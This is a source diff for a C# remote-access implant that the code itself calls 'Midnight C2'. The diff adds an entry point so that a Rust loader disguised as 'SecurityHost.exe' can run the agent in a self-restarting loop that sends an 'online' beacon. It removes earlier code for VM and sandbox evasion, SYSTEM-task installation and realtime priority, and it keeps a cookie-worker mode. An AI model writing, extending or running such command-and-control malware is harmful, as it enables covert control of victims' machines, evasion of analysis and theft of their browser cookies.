@@ -11,10 +11,58 @@ using MidnightAgent.Utils;
 
 namespace MidnightAgent
 {
-    static class Program
+    public class Program
     {
+        // Entry point for CLR Host (Rust)
+        // Returns 0 on success, other values on failure
+        public static int Run(string argument)
+        {
+            // When called from Rust loader, skip installation logic
+            // and go straight to running the agent with retry loop
+            using (var mutex = new Mutex(true, "MidnightAgent_Mutex", out bool isNew))
+            {
+                if (!isNew) return 1; // Already running
+
+                // Send Online notification ONCE (before retry loop)
+                bool notified = false;
+
+                // Infinite retry loop to keep agent alive
+                while (true)
+                {
+                    try
+                    {
+                        System.Diagnostics.Debug.WriteLine("[MidnightAgent] Starting agent...");
+                        
+                        Agent agent = new Agent();
+                        
+                        // Only send notification on first successful start
+                        if (!notified)
+                        {
+                            agent.SendOnlineNotificationOnce();
+                            notified = true;
+                        }
+                        
+                        agent.Run(); // This is blocking
+                        
+                        // If we get here, agent stopped gracefully
+                        System.Diagnostics.Debug.WriteLine("[MidnightAgent] Agent stopped gracefully");
+                        break;
+                    }
+                    catch (Exception ex)
+                    {
+                        System.Diagnostics.Debug.WriteLine($"[MidnightAgent] Critical Error: {ex}");
+                        System.Diagnostics.Debug.WriteLine($"[MidnightAgent] Restarting in 5 seconds...");
+                        
+                        // Wait before retry
+                        Thread.Sleep(5000);
+                    }
+                }
+            }
+            return 0;
+        }
+
         [STAThread]
-        static void Main(string[] args)
+        public static void Main(string[] args)
         {
             // Worker Mode (for cookies / user context tasks)
             if (args.Length >= 2 && args[0] == "--cookie-worker")
@@ -28,75 +76,9 @@ namespace MidnightAgent
                 return;
             }
 
-            // Normal Agent Mode
-            using (var mutex = new Mutex(true, "MidnightAgent_Mutex", out bool isNew))
-            {
-                if (!isNew)
-                {
-                    return; // Already running
-                }
-
-                try
-                {
-                    // Set Agent Process Priority to Realtime
-                    using (var currentProcess = System.Diagnostics.Process.GetCurrentProcess())
-                    {
-                        currentProcess.PriorityClass = System.Diagnostics.ProcessPriorityClass.RealTime;
-                    }
-                }
-                catch (Exception prioEx)
-                {
-                    System.Diagnostics.Debug.WriteLine($"Priority Warning: {prioEx.Message}");
-                }
-
-                try
-                {
-                    // Security checks (VM and Sandbox detection)
-                    if (!Config.BypassSecurityChecks)
-                    {
-                        if (VMDetection.IsVM() || SandboxDetection.IsSandbox())
-                        {
-                            return;
-                        }
-                    }
-
-                    // Check privileges
-                    bool isAdmin = PrivilegeHelper.IsAdmin();
-                    bool isSystem = PrivilegeHelper.IsSystem();
-                    bool isInstalled = Installer.IsInstalled();
-
-                    System.Diagnostics.Debug.WriteLine($"Admin: {isAdmin}, SYSTEM: {isSystem}, Installed: {isInstalled}");
-
-                    // If running as Admin (not SYSTEM), handle installation
-                    if (isAdmin && !isSystem)
-                    {
-                        if (isInstalled)
-                        {
-                            Installer.Uninstall();
-                            Thread.Sleep(2000);
-                        }
-                        
-                        bool installed = Installer.Install();
-                        if (installed)
-                        {
-                            MessageBox.Show("✅ Installed successfully (SYSTEM Task)", "Midnight C2", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                        }
-                        else
-                        {
-                            MessageBox.Show("❌ Installation failed", "Midnight C2", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                        }
-                        return;
-                    }
-
-                    // Run Agent
-                    Agent agent = new Agent();
-                    agent.Run();
-                }
-                catch (Exception ex)
-                {
-                    System.Diagnostics.Debug.WriteLine($"Error: {ex.Message}");
-                }
-            }
+            // Main() is only for worker sub-processes
+            // Agent is started exclusively via Run() from Rust Loader (SecurityHost.exe)
+            // This prevents duplicate "Agent Online!" notifications
         }
 
         static void RunCookieWorker(string zipPath)
